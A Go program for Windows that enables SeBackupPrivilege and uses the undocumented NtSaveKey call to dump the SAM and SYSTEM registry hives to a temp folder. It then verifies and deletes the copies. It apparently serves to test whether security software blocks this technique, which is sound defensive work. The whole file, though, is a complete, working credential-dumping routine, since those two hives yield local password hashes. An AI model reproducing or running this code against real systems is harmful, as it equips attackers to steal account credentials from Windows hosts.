//go:build windows

package main

import (
	"fmt"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	ntdll                  = windows.NewLazyDLL("ntdll.dll")
	procNtSaveKey          = ntdll.NewProc("NtSaveKey")
	hives         []string = []string{"SAM", "SYSTEM"}
	filenames     []string = []string{
		"C:\\Windows\\Temp\\samcopy",
		"C:\\Windows\\Temp\\syscopy",
	}
	success bool = false
)

func getproctoken() (windows.Token, error) {
	var token windows.Token

	fmt.Println("[+] Opening process token to adjust privileges")
	err := windows.OpenProcessToken(
		windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY,
		&token,
	)
	return token, err
}

func createnewstate(priv string, attributes uint32) (
	*windows.Tokenprivileges,
	[]byte,
) {
	var luid windows.LUID

	// Get the LUID of the privilege
	err := windows.LookupPrivilegeValue(
		nil,
		windows.StringToUTF16Ptr(priv),
		&luid,
	)
	if err != nil {
		fmt.Printf("[!] %s\n", err)
	}

	newStateBuffer := make(
		[]byte,
		4+unsafe.Sizeof(windows.LUIDAndAttributes{}),
	)
	nsb0 := &newStateBuffer[0]
	newState := (*windows.Tokenprivileges)(unsafe.Pointer(nsb0))
	newState.PrivilegeCount = 1
	newState.Privileges[0].Luid = luid
	newState.Privileges[0].Attributes = attributes

	return newState, newStateBuffer
}

func adjusttokenprivs(
	token windows.Token,
	newState *windows.Tokenprivileges,
	newStateBuffer []byte,
) error {
	fmt.Println("[+] Adjusting privileges")
	err := windows.AdjustTokenPrivileges(
		token,
		false,
		newState,
		uint32(len(newStateBuffer)),
		nil,
		nil,
	)
	return err
}

/*
Function to enable or disable a privilege for the current token
Ripped this off almost completely from:
https://github.com/golang/go/issues/64170
*/
func enablepriv(priv string) {
	var token windows.Token
	token, err := getproctoken()
	if err != nil {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Exiting...")
		os.Exit(1)
	}

	var newState *windows.Tokenprivileges
	var newStateBuffer []byte
	newState, newStateBuffer = createnewstate(
		priv,
		windows.SE_PRIVILEGE_ENABLED,
	)

	err = adjusttokenprivs(token, newState, newStateBuffer)
	if err != nil {
		fmt.Printf("[-] %s\n", err)
		fmt.Println("[-] Adjusting token privileges was blocked")
		fmt.Println("[+] Exiting...")
		os.Exit(1)
	}
}

/*
Function to disable a privilege for cleanup
It's probably not needed, but leaving this in here
in case it's needed for future use. Just uncomment
it if you need it
*/
/*
func disablepriv(priv string) {
	var token windows.Token
	token, err := getproctoken()
	if err != nil {
		fmt.Printf("[!] Error cleaning up: %s\n", err)
	}

	var newState *windows.Tokenprivileges
	var newStateBuffer []byte
	newState, newStateBuffer = createnewstate(
		priv,
		windows.SE_PRIVILEGE_REMOVED
	)

	err = adjusttokenprivs(token, newState, newStateBuffer)
	if err != nil {
		fmt.Printf("[!] Error cleaning up: %s\n", err)
	}
}
*/

// Function to save a hive to a specified outfile
func savehive(hive string, outfile string) {
	fmt.Printf("[+] Opening handle to %s\n", hive)
	k, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		hive,
		registry.QUERY_VALUE,
	)
	if err != nil {
		fmt.Printf("[-] %s\n", err)
		fmt.Println("[-] Opening handle to hive was blocked")
		fmt.Println("[+] Exiting...")
		os.Exit(1)
	}

	fmt.Printf("[+] Opening handle to %s\n", outfile)
	unifile, err := windows.UTF16PtrFromString(outfile)
	if err != nil {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Unexpected error, exiting...")
		os.Exit(1)
	}

	// the 4 passed as the fifth parameter is for OPEN_ALWAYS
	// from:
	// https://learn.microsoft.com/
	// en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
	fh, err := windows.CreateFile(
		unifile,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0,
		nil,
		4,
		0,
		0,
	)
	if err != nil {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Error creating file, exiting...")
		os.Exit(1)
	}

	// NtSaveKey - sneaky, sneaky
	// Just pass the handle to the key, and handle to the file
	fmt.Println("[+] Saving hive to file.")
	stat, _, err := procNtSaveKey.Call(uintptr(k), uintptr(fh))
	if stat != 0 {
		fmt.Printf("[-] %s\n", err)
		fmt.Printf("[-] status returned is %0x\n", uintptr(stat))
		fmt.Println("[-] Saving hive to file was blocked")
		fmt.Println("[+] Exiting...")
		os.Exit(1)
	}
	defer windows.Close(fh)
}

func execute() {
	fmt.Println("[+] Enabling SeBackupPrivilege")
	enablepriv("SeBackupPrivilege")

	fmt.Println("[+] Saving the SAM and SYSTEM hives")
	for i, h := range hives {
		outfile := filenames[i]
		savehive(h, outfile)
	}

	fmt.Println("[+] Waiting 3 seconds before checking files...")
	time.Sleep(3 * time.Second)

	for _, f := range filenames {
		if _, err := os.Stat(f); err == nil {
			fmt.Printf("[+] %s exists, "+
				"hive was successfully copied\n", f)
			success = true
		}
	}

}

func cleanup() {
	fmt.Println("[+] Waiting 10 seconds before cleaning up...")
	fmt.Println("[+] Cleaning up")

	if success {
		fmt.Println("[+] Attempting to remove saved files")
		for _, f := range filenames {
			if _, err := os.Stat(f); err == nil {
				err = os.Remove(f)
				if err != nil {
					fmt.Printf("[-] Could not remove %s\n", f)
				} else {
					fmt.Printf("[+] Successfully removed %s\n", f)
				}
			}
		}
	} else {
		fmt.Println("[-] Nothing to clean up")
	}

	// disablepriv("SeBackupPrivilege")
}

func main() {
	execute()
	cleanup()
	if success {
		fmt.Println("[+] WOOOOOO! At least one hive was copied")
		fmt.Println("[+] Have a nice day")
		os.Exit(0)
	} else {
		fmt.Println("[-] Execution was blocked (or errored out)")
		fmt.Println("[+] Your day can only get better from here")
		os.Exit(1)

	}
}
